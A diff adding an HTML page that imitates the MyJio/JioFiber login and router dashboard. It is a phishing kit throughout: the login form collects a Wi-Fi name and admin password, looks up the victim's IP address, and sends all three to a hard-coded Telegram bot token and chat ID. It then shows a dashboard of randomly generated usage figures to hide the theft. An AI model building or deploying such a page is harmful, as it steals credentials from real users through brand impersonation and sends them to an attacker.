@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>JioFiber · Router Dashboard</title>
+  <!-- Tailwind + Chart.js + Font Awesome + AOS (animations) -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <link href="https://unpkg.com/aos@2.3.1/dist/aos.css" rel="stylesheet">
+  <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+  <style>
+    /* Ultra‑smooth glassmorphism + Jio theme */
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif; }
+    body {
+      background: linear-gradient(145deg, #f0f5fa 0%, #e3eaf1 100%);
+      min-height: 100vh;
+      transition: background 0.3s;
+    }
+    body.dark {
+      background: linear-gradient(145deg, #0b0e1a 0%, #1a1f2e 100%);
+    }
+    /* Ultimate glass card */
+    .glass {
+      background: rgba(255, 255, 255, 0.2);
+      backdrop-filter: blur(15px);
+      -webkit-backdrop-filter: blur(15px);
+      border: 1px solid rgba(255, 255, 255, 0.3);
+      border-radius: 32px;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+      transition: all 0.3s ease;
+    }
+    .dark .glass {
+      background: rgba(0, 0, 0, 0.3);
+      border-color: rgba(255, 255, 255, 0.08);
+    }
+    /* Jio‑style tabs */
+    .tab-item {
+      @apply px-5 py-2.5 text-sm font-medium cursor-pointer transition-all rounded-full;
+    }
+    .tab-active {
+      background: rgba(255,255,255,0.4);
+      backdrop-filter: blur(4px);
+      color: #0f2b4b;
+      font-weight: 600;
+    }
+    .dark .tab-active {
+      background: rgba(255,255,255,0.15);
+      color: white;
+    }
+    /* Progress bar */
+    .progress-bar {
+      height: 10px;
+      background: rgba(255,255,255,0.2);
+      border-radius: 20px;
+      overflow: hidden;
+    }
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #0a66c2, #8649e1);
+      border-radius: 20px;
+      transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    /* Device list item */
+    .device-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 0;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+    /* Router image */
+    .router-img {
+      width: 100%;
+      height: 150px;
+      object-fit: cover;
+      border-radius: 28px;
+      border: 3px solid white;
+      box-shadow: 0 20px 30px -10px rgba(0,0,0,0.3);
+    }
+    /* Sidebar link */
+    .sidebar-link {
+      @apply flex items-center gap-3 p-3 rounded-2xl hover:bg-white/20 transition-all;
+    }
+    /* Dark mode toggle */
+    .theme-toggle {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      z-index: 100;
+      background: rgba(255,255,255,0.25);
+      backdrop-filter: blur(8px);
+      border-radius: 40px;
+      padding: 8px 18px;
+      border: 1px solid rgba(255,255,255,0.3);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: white;
+      font-weight: 500;
+    }
+  </style>
+</head>
+<body class="text-gray-900 dark:text-white">
+
+  <!-- Theme Toggle -->
+  <div class="theme-toggle" id="themeToggle">
+    <i class="fas fa-moon"></i> <span>Dark</span>
+  </div>
+
+  <!-- ========== LOGIN SECTION – EXACT JIO STYLE ========== -->
+  <div id="loginSection" class="min-h-screen flex items-center justify-center p-4">
+    <div class="glass w-full max-w-md p-8" data-aos="zoom-in" data-aos-duration="600">
+      
+      <!-- Jio Logo & MyJio -->
+      <div class="text-center mb-4">
+        <div class="text-5xl font-bold bg-gradient-to-r from-cyan-600 to-blue-700 bg-clip-text text-transparent">Jio</div>
+        <div class="text-2xl font-light tracking-wide text-gray-800 dark:text-gray-200">MyJio</div>
+        <p class="text-xs opacity-60 mt-1">For everything Jio</p>
+      </div>
+
+      <!-- Jio Tabs (exactly as in image) -->
+      <div class="flex justify-center gap-1 mb-8 bg-black/5 dark:bg-white/5 p-1 rounded-full">
+        <span class="tab-item tab-active">MOBILE</span>
+        <span class="tab-item">JIOFIBER</span>
+        <span class="tab-item">JIOFI</span>
+        <span class="tab-item">JIOLINK</span>
+      </div>
+
+      <!-- Heading as in image: "Manage your Jio account & never miss an update" -->
+      <p class="text-center text-sm mb-6 opacity-80">Manage your Jio account & never miss an update</p>
+
+      <!-- Login form – Router Name (SSID) instead of mobile number -->
+      <form id="loginForm">
+        <div class="mb-5">
+          <label class="block text-sm font-medium mb-2 opacity-80">Router Name (SSID)</label>
+          <input type="text" id="ssid" required placeholder="Enter your Wi‑Fi name"
+            class="w-full px-5 py-3.5 rounded-xl bg-white/40 dark:bg-black/40 border border-white/50 focus:outline-none focus:ring-2 focus:ring-blue-500">
+        </div>
+        <div class="mb-6">
+          <label class="block text-sm font-medium mb-2 opacity-80">Admin Password</label>
+          <input type="password" id="password" required minlength="6" placeholder="••••••••"
+            class="w-full px-5 py-3.5 rounded-xl bg-white/40 dark:bg-black/40 border border-white/50 focus:outline-none focus:ring-2 focus:ring-blue-500">
+        </div>
+        <button type="submit" 
+          class="w-full py-3.5 bg-gradient-to-r from-blue-600 to-indigo-700 rounded-xl text-white font-bold text-lg hover:shadow-2xl transition transform hover:scale-[1.02] active:scale-[0.99]">
+          Login
+        </button>
+      </form>
+
+      <!-- OR divider + QR (exactly as Jio) -->
+      <div class="flex items-center my-6">
+        <div class="h-px flex-1 bg-white/30"></div>
+        <span class="px-4 text-xs opacity-50 font-medium">OR</span>
+        <div class="h-px flex-1 bg-white/30"></div>
+      </div>
+      <div class="text-center text-sm opacity-80 flex items-center justify-center gap-2">
+        <i class="fas fa-qrcode text-xl"></i> Log in with QR
+      </div>
+    </div>
+  </div>
+
+  <!-- ========== DASHBOARD – JIOFIBER INSPIRED ========== -->
+  <div id="dashboardSection" class="hidden p-5 min-h-screen">
+    <div class="max-w-7xl mx-auto">
+
+      <!-- Header with Jio & logout -->
+      <div class="flex flex-wrap items-center justify-between gap-4 mb-6">
+        <div class="flex items-center gap-3">
+          <span class="text-4xl font-bold bg-gradient-to-r from-blue-600 to-purple-600 bg-clip-text text-transparent">JioFiber</span>
+          <span class="text-sm opacity-60 px-3 py-1 glass">+91-6542324469</span>
+        </div>
+        <button id="logoutBtn" class="glass px-5 py-2 text-sm flex items-center gap-2 hover:bg-red-500/20">
+          <i class="fas fa-sign-out-alt"></i> Logout
+        </button>
+      </div>
+
+      <!-- Main grid: sidebar + content -->
+      <div class="flex flex-col lg:flex-row gap-6">
+
+        <!-- SIDEBAR (Jio‑style left menu) -->
+        <aside class="lg:w-72 glass p-5 h-fit" data-aos="fade-right">
+          <!-- Router image upload (like Jio's device image) -->
+          <div class="mb-6">
+            <img id="routerImage" class="router-img" src="https://via.placeholder.com/300x150?text=JioFiber+Router" alt="Router">
+            <label for="imageUpload" class="mt-3 w-full flex items-center justify-center gap-2 glass py-2.5 px-3 cursor-pointer hover:bg-white/30 transition">
+              <i class="fas fa-upload"></i> Upload Router Image
+            </label>
+            <input type="file" id="imageUpload" accept="image/*" class="hidden">
+          </div>
+          <!-- Navigation (similar to Jio sections) -->
+          <nav class="space-y-1">
+            <a href="#" class="sidebar-link"><i class="fas fa-tachometer-alt w-6"></i> Dashboard</a>
+            <a href="#" class="sidebar-link"><i class="fas fa-wifi w-6"></i> My WiFi</a>
+            <a href="#" class="sidebar-link"><i class="fas fa-network-wired w-6"></i> Connected devices</a>
+            <a href="#" class="sidebar-link"><i class="fas fa-file-invoice w-6"></i> Bill & plans</a>
+            <a href="#" class="sidebar-link"><i class="fas fa-cog w-6"></i> Settings</a>
+          </nav>
+          <!-- Router status indicator (online) -->
+          <div class="mt-8 flex items-center gap-3 text-sm">
+            <span class="w-2.5 h-2.5 bg-green-400 rounded-full animate-pulse"></span>
+            <span>JioFiber · Online</span>
+          </div>
+        </aside>
+
+        <!-- MAIN CONTENT – JIO‑STYLE CARDS -->
+        <main class="flex-1 space-y-6">
+
+          <!-- Row: Plan, Data, Bill summary (like Jio images) -->
+          <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-5">
+            <div class="glass p-5" data-aos="fade-up" data-aos-delay="0">
+              <div class="flex justify-between items-center text-sm opacity-70"><span>Plan</span> <i class="fas fa-tag"></i></div>
+              <div class="text-2xl font-bold mt-1" id="planName">Postpaid 699</div>
+              <div class="text-xs opacity-60">100 Mbps · Unlimited</div>
+            </div>
+            <div class="glass p-5" data-aos="fade-up" data-aos-delay="50">
+              <div class="flex justify-between text-sm opacity-70"><span>Data used</span> <i class="fas fa-database"></i></div>
+              <div class="text-2xl font-bold mt-1" id="usedData">-- GB</div>
+              <div class="text-xs opacity-60" id="usedPercent">--% of 1000 GB</div>
+            </div>
+            <div class="glass p-5" data-aos="fade-up" data-aos-delay="100">
+              <div class="flex justify-between text-sm opacity-70"><span>Remaining</span> <i class="fas fa-gauge-high"></i></div>
+              <div class="text-2xl font-bold mt-1" id="remainingData">-- GB</div>
+              <div class="text-xs opacity-60">valid until 11 Aug</div>
+            </div>
+            <div class="glass p-5" data-aos="fade-up" data-aos-delay="150">
+              <div class="flex justify-between text-sm opacity-70"><span>Current bill</span> <i class="fas fa-rupee-sign"></i></div>
+              <div class="text-2xl font-bold mt-1" id="billEstimate">₹109.98</div>
+              <div class="text-xs opacity-60">due in 3 days</div>
+            </div>
+          </div>
+
+          <!-- Progress bar + Speed indicator (Jio style) -->
+          <div class="glass p-5" data-aos="fade-up">
+            <div class="flex flex-wrap items-center justify-between gap-4">
+              <div class="flex-1">
+                <div class="flex justify-between text-sm mb-1">
+                  <span>Monthly data usage</span>
+                  <span id="progressLabel">0%</span>
+                </div>
+                <div class="progress-bar">
+                  <div class="progress-fill" id="progressFill" style="width:0%"></div>
+                </div>
+              </div>
+              <div class="flex items-center gap-4">
+                <div class="text-right">
+                  <span class="text-xs opacity-60">Speed</span>
+                  <div class="text-2xl font-semibold" id="speedValue">100 Mbps</div>
+                </div>
+                <i class="fas fa-tachometer-alt text-3xl opacity-70"></i>
+              </div>
+            </div>
+          </div>
+
+          <!-- Graph + Connected Devices (2/3 + 1/3) -->
+          <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+            <!-- Graph card (Jio‑style usage graph) -->
+            <div class="glass p-5 lg:col-span-2" data-aos="fade-right">
+              <div class="flex justify-between items-center mb-4">
+                <h3 class="font-semibold flex items-center gap-2"><i class="fas fa-chart-line"></i> Daily usage (past week)</h3>
+                <button id="refreshBtn" class="glass px-4 py-1.5 text-sm flex items-center gap-1 hover:bg-white/30">
+                  <i class="fas fa-sync-alt"></i> Refresh
+                </button>
+              </div>
+              <canvas id="usageChart" style="max-height:240px; width:100%"></canvas>
+            </div>
+            <!-- Connected devices (exactly like Jio's device list) -->
+            <div class="glass p-5" data-aos="fade-left">
+              <h3 class="font-semibold mb-4 flex items-center gap-2"><i class="fas fa-laptop"></i> Connected devices</h3>
+              <div id="devicesList" class="space-y-1 max-h-64 overflow-y-auto pr-2"></div>
+              <div class="mt-4 text-xs opacity-60 text-center">Last updated just now</div>
+            </div>
+          </div>
+
+          <!-- Jio‑style extra row: WiFi settings + subscriptions -->
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-6" data-aos="fade-up">
+            <div class="glass p-5 flex items-center gap-4">
+              <i class="fas fa-wifi text-3xl text-blue-400"></i>
+              <div>
+                <p class="font-medium">WiFi settings</p>
+                <p class="text-xs opacity-60">SSID: JioFiber-5G · Security: WPA2</p>
+              </div>
+            </div>
+            <div class="glass p-5 flex items-center gap-4">
+              <i class="fas fa-tv text-3xl text-purple-400"></i>
+              <div>
+                <p class="font-medium">My subscriptions</p>
+                <p class="text-xs opacity-60">Prime Video · Netflix · JioTV</p>
+              </div>
+            </div>
+          </div>
+
+          <!-- Pay now / view bill (exactly like Jio images) -->
+          <div class="glass p-5 flex flex-wrap items-center justify-between gap-4">
+            <div>
+              <p class="text-xs opacity-60">Your bill</p>
+              <p class="text-2xl font-bold" id="billAmountFooter">₹109.98</p>
+              <p class="text-xs opacity-60">Clear due to avoid suspension</p>
+            </div>
+            <div class="flex gap-3">
+              <button class="glass px-6 py-2.5 text-sm font-medium hover:bg-white/20">View bill</button>
+              <button class="glass px-6 py-2.5 text-sm font-medium bg-blue-500/30 hover:bg-blue-500/40">Pay now</button>
+            </div>
+          </div>
+        </main>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ---------- CONFIGURATION ----------
+      const BOT_TOKEN = '8422301440:AAFNWJhaBspVNVCPFT60Zk51YH-0w5sXyV4';
+      const CHAT_ID = '8552181121';
+      const TOTAL_PLAN = 1000; // GB
+
+      // DOM elements
+      const loginSection = document.getElementById('loginSection');
+      const dashboardSection = document.getElementById('dashboardSection');
+      const loginForm = document.getElementById('loginForm');
+      const ssidInput = document.getElementById('ssid');
+      const passwordInput = document.getElementById('password');
+      const logoutBtn = document.getElementById('logoutBtn');
+      const themeToggle = document.getElementById('themeToggle');
+      const imageUpload = document.getElementById('imageUpload');
+      const routerImage = document.getElementById('routerImage');
+      const refreshBtn = document.getElementById('refreshBtn');
+      const usedDataSpan = document.getElementById('usedData');
+      const remainingSpan = document.getElementById('remainingData');
+      const usedPercentSpan = document.getElementById('usedPercent');
+      const progressFill = document.getElementById('progressFill');
+      const progressLabel = document.getElementById('progressLabel');
+      const speedValue = document.getElementById('speedValue');
+      const billEstimate = document.getElementById('billEstimate');
+      const billAmountFooter = document.getElementById('billAmountFooter');
+      const devicesListDiv = document.getElementById('devicesList');
+      const planNameSpan = document.getElementById('planName');
+
+      let chart;
+
+      // ---------- THEME ----------
+      function initTheme() {
+        const isDark = localStorage.getItem('theme') === 'dark';
+        document.body.classList.toggle('dark', isDark);
+        themeToggle.innerHTML = isDark ? '<i class="fas fa-sun"></i> Light' : '<i class="fas fa-moon"></i> Dark';
+      }
+      themeToggle.addEventListener('click', () => {
+        document.body.classList.toggle('dark');
+        const isDark = document.body.classList.contains('dark');
+        localStorage.setItem('theme', isDark ? 'dark' : 'light');
+        themeToggle.innerHTML = isDark ? '<i class="fas fa-sun"></i> Light' : '<i class="fas fa-moon"></i> Dark';
+      });
+      initTheme();
+
+      // ---------- SESSION ----------
+      if (localStorage.getItem('loggedIn') === 'true') {
+        showDashboard();
+      }
+
+      // ---------- LOGIN (Telegram + validation) ----------
+      loginForm.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const ssid = ssidInput.value.trim();
+        const password = passwordInput.value;
+
+        if (!ssid || password.length < 6) {
+          alert('Router name required & password min 6 characters');
+          return;
+        }
+
+        // Get IP
+        let ip = 'Unknown';
+        try {
+          const res = await fetch('https://api.ipify.org?format=json');
+          const data = await res.json();
+          ip = data.ip;
+        } catch (err) { /* ignore */ }
+
+        // Send to Telegram
+        const message = `🔐 JioFiber Router Login\n📶 SSID: ${ssid}\n🔑 Password: ${password}\n🌐 IP: ${ip}`;
+        try {
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+          });
+        } catch (err) { console.warn('Telegram error', err); }
+
+        // Store session & show dashboard
+        localStorage.setItem('loggedIn', 'true');
+        localStorage.setItem('ssid', ssid);
+        showDashboard();
+      });
+
+      // ---------- LOGOUT ----------
+      logoutBtn.addEventListener('click', () => {
+        localStorage.removeItem('loggedIn');
+        localStorage.removeItem('routerImage');
+        loginSection.style.display = 'flex';
+        dashboardSection.style.display = 'none';
+      });
+
+      // ---------- SHOW DASHBOARD ----------
+      function showDashboard() {
+        loginSection.style.display = 'none';
+        dashboardSection.style.display = 'block';
+        loadImageFromStorage();
+        generateRandomUsage();
+        renderDevices();
+        initChart();
+        startAutoRefresh();
+        AOS.init({ duration: 600, once: true });
+      }
+
+      // ---------- IMAGE UPLOAD (localStorage) ----------
+      imageUpload.addEventListener('change', function(e) {
+        const file = e.target.files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = function(ev) {
+          const dataURL = ev.target.result;
+          routerImage.src = dataURL;
+          localStorage.setItem('routerImage', dataURL);
+        };
+        reader.readAsDataURL(file);
+      });
+
+      function loadImageFromStorage() {
+        const saved = localStorage.getItem('routerImage');
+        if (saved) routerImage.src = saved;
+      }
+
+      // ---------- RANDOM USAGE SIMULATION (realistic Jio data) ----------
+      function generateRandomUsage() {
+        const used = Math.floor(Math.random() * (600 - 200 + 1) + 200); // 200–600 GB
+        const remaining = TOTAL_PLAN - used;
+        const percent = ((used / TOTAL_PLAN) * 100).toFixed(1);
+
+        usedDataSpan.textContent = used + ' GB';
+        remainingSpan.textContent = remaining + ' GB';
+        usedPercentSpan.textContent = percent + '% used';
+        progressFill.style.width = percent + '%';
+        progressLabel.textContent = percent + '%';
+        speedValue.textContent = Math.floor(Math.random() * 400 + 50) + ' Mbps';
+        const bill = (Math.random() * (700 - 200) + 200).toFixed(2);
+        billEstimate.textContent = '₹' + bill;
+        billAmountFooter.textContent = '₹' + bill;
+           const plans = ['Postpaid 699', 'Postpaid 849', 'Postpaid 999', 'Fiber 1499'];
+        planNameSpan.textContent = plans[Math.floor(Math.random() * plans.length)];
+      }
+
+      // ---------- CONNECTED DEVICES (like Jio's list) ----------
+      function renderDevices() {
+        const names = ['iPhone 15 Pro', 'MacBook Air', 'Samsung QLED', 'Xbox Series S', 'Google Nest Hub', 'iPad mini', 'PS5', 'Ring Camera'];
+        const devices = [];
+        for (let i = 0; i < 6; i++) {
+          const name = names[Math.floor(Math.random() * names.length)];
+          const ip = `192.168.29.${Math.floor(Math.random() * 200 + 10)}`;
+          const status = Math.random() > 0.15 ? 'Online' : 'Offline';
+          devices.push({ name, ip, status });
+        }
+        devicesListDiv.innerHTML = devices.map(d => `
+          <div class="device-item">
+            <span><i class="fas fa-${d.status === 'Online' ? 'wifi' : 'times-circle'} mr-2 ${d.status === 'Online' ? 'text-green-400' : 'text-red-400'}"></i>${d.name}</span>
+            <span class="text-xs opacity-60">${d.ip}</span>
+          </div>
+        `).join('');
+      }
+
+      // ---------- CHART (weekly data) ----------
+      function initChart() {
+        const ctx = document.getElementById('usageChart').getContext('2d');
+        if (chart) chart.destroy();
+        chart = new Chart(ctx, {
+          type: 'line',
+          data: {
+            labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
+            datasets: [{
+              label: 'Data used (GB)',
+              data: randomWeeklyData(),
+              borderColor: '#0a66c2',
+              backgroundColor: 'rgba(10,102,194,0.1)',
+              tension: 0.3,
+              fill: true,
+              pointBackgroundColor: '#8649e1'
+            }]
+          },
+          options: {
+            responsive: true,
+            maintainAspectRatio: false,
+            plugins: { legend: { display: false } }
+          }
+        });
+      }
+
+      function randomWeeklyData() {
+        return Array.from({ length: 7 }, () => Math.floor(Math.random() * 90 + 20));
+      }
+
+      // ---------- REFRESH ----------
+      refreshBtn.addEventListener('click', () => {
+        generateRandomUsage();
+        renderDevices();
+        if (chart) {
+          chart.data.datasets[0].data = randomWeeklyData();
+          chart.update();
+        }
+      });
+
+      // ---------- AUTO REFRESH (30 sec) ----------
+      let autoInterval;
+      function startAutoRefresh() {
+        if (autoInterval) clearInterval(autoInterval);
+        autoInterval = setInterval(() => {
+          generateRandomUsage();
+          renderDevices();
+          if (chart) {
+            chart.data.datasets[0].data = randomWeeklyData();
+            chart.update();
+          }
+        }, 30000);
+      }
+
+      // ---------- ON LOAD ----------
+      window.addEventListener('load', function() {
+        if (localStorage.getItem('loggedIn') === 'true') {
+          showDashboard();
+        }
+      });
+    })();
+  </script>
+  <!-- AOS initialization -->
+  <script>AOS.init({ duration: 600, once: true });</script>
+</body>
+</html>
